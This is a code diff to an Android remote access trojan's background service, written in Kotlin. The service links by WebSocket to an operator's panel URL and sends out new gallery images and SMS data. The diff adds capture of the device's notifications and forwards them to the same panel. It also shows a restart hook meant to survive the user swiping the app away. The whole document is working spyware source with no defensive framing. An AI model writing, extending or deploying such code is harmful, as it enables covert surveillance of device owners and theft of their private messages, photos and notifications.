@@ -13,6 +13,12 @@ import java.util.concurrent.TimeUnit
 
 class RatService : Service() {
 
+    companion object {
+        const val NOTIF_ID = 1
+
+        @Volatile var instance: RatService? = null
+    }
+
     private val client = OkHttpClient.Builder()
         .readTimeout(0, TimeUnit.MILLISECONDS)
         .pingInterval(20, TimeUnit.SECONDS)
@@ -30,6 +36,7 @@ class RatService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        instance = this
         deviceId = android.provider.Settings.Secure.getString(
             contentResolver,
             android.provider.Settings.Secure.ANDROID_ID
@@ -41,6 +48,11 @@ class RatService : Service() {
         }
         galleryWatcher = GalleryWatcher(this) { img ->
             sendEvent(mapOf("type" to "gallery_new", "data" to img))
+        }
+
+        // Register notification listener callback
+        NotificationListener.callback = { data ->
+            sendNotificationEvent(data)
         }
     }
 
@@ -71,9 +83,6 @@ class RatService : Service() {
             .build()
     }
 
-    // ============================================================
-    // CONNECT
-    // ============================================================
     private fun connect() {
         val cfg = App.config
         val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=${cfg.username}"
@@ -105,15 +114,11 @@ class RatService : Service() {
             }
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
-                if (running) {
-                    scheduleReconnect()
-                }
+                if (running) scheduleReconnect()
             }
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
-                if (running) {
-                    scheduleReconnect()
-                }
+                if (running) scheduleReconnect()
             }
         })
     }
@@ -134,6 +139,19 @@ class RatService : Service() {
             val payload = JsonObject().apply {
                 addProperty("type", "event")
                 add("data", gson.toJsonTree(data))
+            }
+            ws?.send(gson.toJson(payload))
+        } catch (_: Exception) {}
+    }
+
+    fun sendNotificationEvent(data: Map<String, String>) {
+        try {
+            val payload = JsonObject().apply {
+                addProperty("type", "event")
+                add("data", gson.toJsonTree(mapOf(
+                    "type" to "notif_new",
+                    "data" to data
+                )))
             }
             ws?.send(gson.toJson(payload))
         } catch (_: Exception) {}
@@ -160,9 +178,6 @@ class RatService : Service() {
         }.start()
     }
 
-    // ============================================================
-    // ON TASK REMOVED (anti swipe-kill)
-    // ============================================================
     override fun onTaskRemoved(rootIntent: Intent?) {
         try {
             val restart = Intent(applicationContext, RatService::class.java)
@@ -181,12 +196,10 @@ class RatService : Service() {
         try { smsWatcher?.stop() } catch (_: Exception) {}
         try { galleryWatcher?.stop() } catch (_: Exception) {}
         try { ws?.close(1000, "stop") } catch (_: Exception) {}
+        NotificationListener.callback = null
+        if (instance === this) instance = null
         super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
-
-    companion object {
-        const val NOTIF_ID = 1
-    }
 }
